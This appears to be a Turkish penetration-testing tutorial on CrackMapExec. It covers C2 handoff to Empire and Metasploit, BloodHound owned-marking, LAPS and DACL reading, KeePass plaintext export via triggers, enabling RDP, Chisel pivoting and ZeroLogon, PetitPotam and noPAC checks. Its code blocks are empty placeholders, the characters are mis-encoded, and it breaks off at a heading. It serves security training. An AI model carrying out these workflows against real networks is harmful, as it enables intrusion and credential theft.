### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

